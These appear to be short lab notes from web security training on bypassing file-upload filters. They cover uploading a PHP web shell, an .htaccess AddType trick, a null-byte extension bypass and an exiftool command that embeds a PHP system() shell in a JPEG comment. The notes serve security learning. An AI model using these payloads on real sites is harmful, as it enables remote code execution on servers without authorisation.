# Lab 1
Upload a generic php web shell and get the file.

# Lab 2
Content-type headers check data client side.

# Lab 3
Change the upload location by using `filename` field.

# Lab 4
Can change the `.htaccess` file to include any extension to run php
```txt
AddType applcation/x-httpd-php .notphp
```

# Lab 5
You can put a null byte `%00` at the end fo the file name which will drop the extension. ie. 
```
shell.php%00.jpg
```
The application will think its a jpg but then upload the php file.

# Lab 6
Magic bytes with jpg files.
```bash
exiftool -Comment="<?php echo 'START' . system($_GET['command']); ?>"
```
